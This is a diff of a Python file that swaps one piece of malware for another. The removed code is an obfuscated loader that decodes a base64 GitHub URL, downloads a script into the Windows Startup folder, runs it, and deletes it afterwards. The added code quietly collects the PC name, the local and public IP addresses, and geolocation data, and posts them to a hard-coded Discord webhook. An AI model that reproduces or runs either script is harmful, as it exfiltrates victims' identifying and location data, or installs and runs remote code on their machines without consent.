@@ -1,51 +1,66 @@
-import os as _0, requests as _1, getpass as _2, atexit as _3, time as _4
-import base64 as _5
+import requests
+import socket
+import platform
 
-
-_6 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0pha2V5V2l0aENoYXRncHQvYXNmZGYvcmVmcy9oZWFkcy9tYWluL2FzZD90b2tlbj1HSFNBVDBBQUFBQUFDNVBDWk41QldPQ0NVNFVHNkpYVllMQVo1UlpSN1E='
-
-
-_7 = _5.b64decode(_6).decode()
-
-_8 = _2.getuser()
-
-_9 = f'C:\\Users\\{_8}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
-
-if not _0.path.exists(_9):
-    _0.makedirs(_9)
-
-_10 = _0.path.join(_9, 'startup_script.py')
-
-
-_11 = _1.get(_7, verify=False)
-
-if _11.status_code == 200:
-    with open(_10, 'w') as _12:
-        _12.write(_11.text)
-    print(f'Success! The script has been saved to {_10}')
-
-
-    if _0.path.exists(_10):
-        print(f"The script exists at {_10}")
-    else:
-        print(f"Failed to create the script at {_10}")
-    
-    def _13():
-        try:
-            print("Waiting 3 seconds before deleting the script...")
-            _4.sleep(3)
-            _0.remove(_10)
-            print('Script deleted successfully.')
-        except Exception as _14:
-            print(f'Error deleting the script: {_14}')
-
-    _3.register(_13)
-
+# Get public IP and additional information (like location)
+def get_ip_info():
     try:
-        print(f"Attempting to open the script at {_10}")
-        _0.startfile(_10)
-        print('Script opened in a new window!')
-    except Exception as _15:
-        print(f'Error opening the script: {_15}')
-else:
-    print(f'Failed to fetch content from GitHub. Status code: {_11.status_code}')
+        # Use ipinfo.io API to get public IP and location data
+        response = requests.get('https://ipinfo.io/json')
+        ip_info = response.json()  # Parse the JSON response
+        return ip_info
+    except requests.exceptions.RequestException as e:
+        print(f"Error retrieving IP information: {e}")
+        return None
+
+# Get the local IP address
+def get_local_ip():
+    try:
+        local_ip = socket.gethostbyname(socket.gethostname())
+        return local_ip
+    except socket.error as e:
+        print(f"Error retrieving local IP address: {e}")
+        return None
+
+# Get the PC's name
+def get_pc_name():
+    return platform.node()
+
+# Send information to Discord Webhook as a message
+def send_to_webhook(pc_name, public_ip_info, local_ip, webhook_url):
+    message = (
+        f"**PC Information**\n"
+        f"**PC Name:** {pc_name}\n"
+        f"**Public IP:** {public_ip_info.get('ip')}\n"
+        f"**Location:** {public_ip_info.get('city')}, {public_ip_info.get('region')}, {public_ip_info.get('country')}\n"
+        f"**Organization:** {public_ip_info.get('org')}\n"
+        f"**Hostname:** {public_ip_info.get('hostname')}\n"
+        f"**Local IP:** {local_ip}\n\n"
+        f"**Full Location Data:**\n{public_ip_info}"
+    )
+    
+    data = {
+        "content": message
+    }
+    
+    try:
+        response = requests.post(webhook_url, json=data)
+        if response.status_code == 204:
+            print("Information successfully sent to the webhook.")
+        else:
+            print(f"Failed to send to webhook. Status code: {response.status_code}")
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending to webhook: {e}")
+
+if __name__ == "__main__":
+    # Replace with your Discord webhook URL
+    webhook_url = 'https://discord.com/api/webhooks/1340621271800614963/w_YoBh3ySVtKFzeDlpJyCRjF-9uxGpdF9wmyNpxS4dOzzJYlct8PV6rtHbnI-VE4awt3'
+    
+    # Get the user's information
+    pc_name = get_pc_name()
+    public_ip_info = get_ip_info()
+    local_ip = get_local_ip()
+    
+    # Send the information to Discord if IP data is available
+    if public_ip_info and local_ip:
+        send_to_webhook(pc_name, public_ip_info, local_ip, webhook_url)
